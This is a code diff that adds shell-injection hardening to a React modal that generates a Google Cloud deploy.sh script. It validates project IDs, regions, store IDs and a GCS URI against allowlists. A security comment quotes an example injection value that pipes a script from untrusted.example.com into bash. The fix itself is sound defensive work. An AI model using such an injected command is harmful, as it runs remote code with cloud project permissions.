@@ -1,6 +1,13 @@
+import { toErrorMessage } from '../../utils/errors';
 import React, { useState, useEffect } from 'react';
 import { Config, GcsBucket } from '../../types';
 import * as api from '../../services/apiService';
+import {
+    assertValidBucketPath,
+    assertValidGcpResourceName,
+    assertValidOpaqueId,
+    assertValidProjectIdentifier,
+} from '../../services/shellSafety';
 import mainPyTemplate from './main.py.template?raw';
 
 declare let JSZip: any;
@@ -285,7 +292,66 @@ const GroupLicenseDeploymentModal: React.FC<GroupLicenseDeploymentModalProps> = 
     const requirementsTxt = "Flask==3.0.0\ngunicorn==22.0.0\ngoogle-auth>=2.22.0\nrequests>=2.31.0";
     const dockerfile = "FROM python:3.11-slim\nENV PYTHONUNBUFFERED True\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\nCOPY . .\nCMD [\"gunicorn\", \"--bind\", \"0.0.0.0:8080\", \"--workers\", \"1\", \"--threads\", \"8\", \"--timeout\", \"0\", \"main:app\"]";
 
+    /**
+     * SECURITY (F-01): allowlist-validates every user- or API-supplied value that
+     * generateDeploySh() concatenates into the generated deploy.sh.
+     *
+     * deploy.sh is executed by `bash` (the Cloud Build step below, or locally after
+     * "Download .zip"), so an unvalidated value such as
+     * `x; curl https://untrusted.example.com/s.sh | bash; #` would run as a shell
+     * command with the Cloud Build service account's project permissions. These
+     * allowlists permit no shell metacharacter at all.
+     *
+     * Throws with a user-facing message; every caller surfaces it via setDeployError.
+     */
+    const validateDeploymentInputs = () => {
+        // Project ID: accepts both a project ID ('my-project-123') and a numeric
+        // project number, which this field is legitimately seeded with. Both forms
+        // are shell-safe.
+        assertValidProjectIdentifier(config.projectId, 'Project ID');
+
+        // Interpolated as REGION and LOCATION; location is also concatenated into the
+        // service names, job names and the --labels values.
+        assertValidGcpResourceName(config.runRegion, 'Run region');
+        assertValidGcpResourceName(appLocation, 'App location');
+
+        // User store IDs contain underscores (the default is 'default_user_store'),
+        // so the opaque-id allowlist applies rather than the resource-name one.
+        assertValidOpaqueId(config.userStoreId, 'User Store ID');
+
+        // Subscription tier is an API-derived identifier such as
+        // 'SUBSCRIPTION_TIER_ENTERPRISE' -- uppercase with underscores.
+        assertValidOpaqueId(selectedTier, 'Subscription tier');
+
+        // PROJECT_NUMBER is passed straight into --set-env-vars. It is user-entered
+        // (the ProjectInput field on the License page) and may hold either a numeric
+        // project number or a project ID string; both fit the opaque-id allowlist. An
+        // empty value is inert in the shell, so it is left alone rather than blocking
+        // the deploy with a validation error.
+        if (projectNumber.trim()) {
+            assertValidOpaqueId(projectNumber, 'Project number');
+        }
+
+        // CONFIG_GCS_URI is interpolated into deploy.sh three times (the variable and
+        // both --set-env-vars). Validate the assembled gs:// URI itself, so the bucket
+        // segment and every path segment are covered in one call.
+        assertValidBucketPath(configGcsUri, 'Config GCS URI');
+
+        // Note: groupsInput (comma-separated emails) is NOT validated here because it is
+        // never interpolated into deploy.sh -- it only reaches entitlements.json, which
+        // is uploaded to GCS as JSON data and read by main.py at runtime.
+    };
+
     const handleDownload = async () => {
+        // SECURITY (F-01): the downloaded deploy.sh is run by a shell on the operator's
+        // machine, so it gets the same validation as the Cloud Build path.
+        try {
+            validateDeploymentInputs();
+        } catch (err: unknown) {
+            setDeployError(toErrorMessage(err, 'Invalid deployment configuration.'));
+            return;
+        }
+
         const zip = new JSZip();
         zip.file('main.py', mainPy);
         zip.file('deploy.sh', deploySh);
@@ -327,6 +393,11 @@ const GroupLicenseDeploymentModal: React.FC<GroupLicenseDeploymentModalProps> = 
         setDeployError(null);
 
         try {
+            // SECURITY (F-01): fail fast, before the config upload, the source zip and
+            // the Cloud Build steps are assembled. deploySh is already rendered for
+            // preview, but nothing is executed until the build is created.
+            validateDeploymentInputs();
+
             const configBlob = new Blob([configJson], { type: 'application/json' });
             const configFile = new File([configBlob], "entitlements.json", { type: "application/json" });
             await api.uploadFileToGcs(selectedBucket, "config/entitlements.json", configFile, config.projectId);
@@ -370,8 +441,8 @@ const GroupLicenseDeploymentModal: React.FC<GroupLicenseDeploymentModalProps> = 
             
             onClose();
 
-        } catch (err: any) {
-            setDeployError(err.message || "Failed to trigger Cloud Build.");
+        } catch (err: unknown) {
+            setDeployError(toErrorMessage(err, "Failed to trigger Cloud Build."));
         } finally {
             setIsDeploying(false);
         }
@@ -545,7 +616,7 @@ const GroupLicenseDeploymentModal: React.FC<GroupLicenseDeploymentModalProps> = 
                                         <h4 className="font-medium text-blue-300">Step 2: Add the Service Account to the Group</h4>
                                         <ul className="list-disc list-inside ml-4 space-y-1">
                                             <li>Add the following service account email as a member of your new group:</li>
-                                            <li className="list-none ml-4"><code className="bg-gray-700 px-1 rounded">license-grouper-sa@ancient-sandbox-322523.iam.gserviceaccount.com</code></li>
+                                            <li className="list-none ml-4"><code className="bg-gray-700 px-1 rounded">license-grouper-sa@my-project-123456.iam.gserviceaccount.com</code></li>
                                             <li>(Workspace will consider it an external member, which is why Step 1 is required).</li>
                                         </ul>
 
